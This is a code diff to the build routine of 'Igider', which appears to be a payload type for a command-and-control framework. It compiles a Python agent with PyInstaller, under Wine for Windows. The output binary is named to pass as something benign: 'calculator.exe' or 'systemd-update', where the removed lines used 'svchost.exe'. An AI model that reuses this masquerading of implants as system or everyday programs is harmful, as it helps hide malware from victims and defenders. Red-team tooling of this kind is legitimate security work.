@@ -232,28 +232,84 @@ class Igider(PayloadType):
     
 
     def _build_executable(self, code: str, target_os: str) -> bytes:
+        # Check if PyInstaller is available
+        try:
+            subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], capture_output=True, check=True, text=True)
+            self.logger.info("PyInstaller found")
+        except (subprocess.CalledProcessError, FileNotFoundError):
+            raise Exception("PyInstaller is not installed or not available in PATH")
+
         with tempfile.TemporaryDirectory() as temp_dir:
-            # Write the Python code
+            # Create main Python file
             main_py = os.path.join(temp_dir, "main.py")
             with open(main_py, "w") as f:
                 f.write(code)
+                self.logger.info(f"Created main.py at {main_py}")
 
-            # PyInstaller command for Windows EXE
-            cmd = ["wine", sys.executable, "-m", "PyInstaller", "--log-level=DEBUG", main_py] if target_os == "windows" else [sys.executable, "-m", "PyInstaller", "--log-level=DEBUG", main_py]
-            # Run PyInstaller
+            # Create spec file
+            spec_content = self._create_pyinstaller_spec(code, target_os)
+            spec_file = os.path.join(temp_dir, "build.spec")
+            with open(spec_file, "w") as f:
+                f.write(spec_content)
+                self.logger.info(f"Created spec file at {spec_file}")
+
             try:
-                subprocess.run(cmd, check=True, cwd=temp_dir, timeout=300)
-                exe_path = os.path.join(temp_dir, "dist", "svchost.exe")
-                
-                # Verify the EXE is a valid Windows binary
-                if not os.path.exists(exe_path):
-                    raise Exception("EXE not found!")
-                
-                # Read and return the binary
+                # Run PyInstaller with Wine for Windows builds
+                cmd = ["wine", sys.executable, "-m", "PyInstaller", "--log-level=DEBUG", spec_file] if target_os == "windows" else [sys.executable, "-m", "PyInstaller", "--log-level=DEBUG", spec_file]
+                self.logger.info(f"Running command: {' '.join(cmd)}")
+                self.logger.info(f"Working directory: {temp_dir}")
+
+                result = subprocess.run(
+                    cmd,
+                    capture_output=True,
+                    text=True,
+                    cwd=temp_dir,
+                    timeout=300  # 5 minute timeout
+                )
+
+                self.logger.info(f"PyInstaller stdout: {result.stdout}")
+                self.logger.info(f"PyInstaller stderr: {result.stderr}")
+
+                if result.returncode != 0:
+                    raise Exception(f"PyInstaller failed with return code {result.returncode}: {result.stderr}")
+
+                # Define executable name
+                exe_name = "calculator.exe" if target_os == "windows" else "systemd-update"
+                dist_dir = os.path.join(temp_dir, "dist")
+                exe_path = os.path.join(dist_dir, exe_name)
+
+                # Check Wine's filesystem for the executable
+                wine_dist_dir = os.path.join(os.environ.get("WINEPREFIX", "/root/.wine"), "drive_c", "users", "root", "Temp", os.path.basename(temp_dir), "dist")
+                wine_exe_path = os.path.join(wine_dist_dir, exe_name)
+
+                self.logger.info(f"Checking for executable at: {exe_path}")
+                self.logger.info(f"Checking Wine path: {wine_exe_path}")
+
+                # Try native path first
+                if os.path.exists(exe_path):
+                    self.logger.info(f"Found executable at: {exe_path}")
+                elif os.path.exists(wine_exe_path):
+                    self.logger.info(f"Found executable in Wine path: {wine_exe_path}")
+                    exe_path = wine_exe_path
+                else:
+                    # Log contents of dist directories
+                    if os.path.exists(dist_dir):
+                        self.logger.info(f"Contents of dist dir: {os.listdir(dist_dir)}")
+                    if os.path.exists(wine_dist_dir):
+                        self.logger.info(f"Contents of Wine dist dir: {os.listdir(wine_dist_dir)}")
+                    raise Exception(f"Executable not found at {exe_path} or {wine_exe_path}")
+
+                # Read and return the executable
                 with open(exe_path, "rb") as f:
-                    return f.read()
+                    executable_data = f.read()
+                self.logger.info(f"Successfully built executable of size: {len(executable_data)} bytes")
+                return executable_data
+
+            except subprocess.TimeoutExpired:
+                raise Exception("PyInstaller build timed out after 5 minutes")
             except Exception as e:
-                raise Exception(f"Build failed: {str(e)}")
+                self.logger.error(f"Executable build failed: {str(e)}")
+                raise Exception(f"Failed to build executable: {str(e)}")
 
     async def build(self) -> BuildResponse:
         """Build the Igider payload with the specified configuration."""
